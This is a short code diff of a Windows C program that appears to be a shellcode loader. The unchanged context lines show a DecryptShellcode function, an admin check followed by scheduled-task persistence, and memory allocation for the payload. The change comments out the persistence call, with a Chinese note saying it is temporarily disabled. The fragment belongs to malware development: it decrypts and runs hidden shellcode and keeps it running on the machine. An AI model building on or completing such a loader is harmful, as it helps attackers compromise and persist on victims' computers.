@@ -102,7 +102,7 @@ void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
 
 
 void test() {
-	
+
 }
 
 
@@ -224,7 +224,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	// =========================== Add to scheduleTask =============================
 	// if has admin permission, add to scheduleTask
 	if (IsRunningAsAdmin()) {
-		addScheduleTask();
+		// addScheduleTask(); // TODO 暂时注释掉
 	}
 	// ============================= Allocate Memory ===============================
 	NTSTATUS status = AllocateMem(&lpMem, &size);
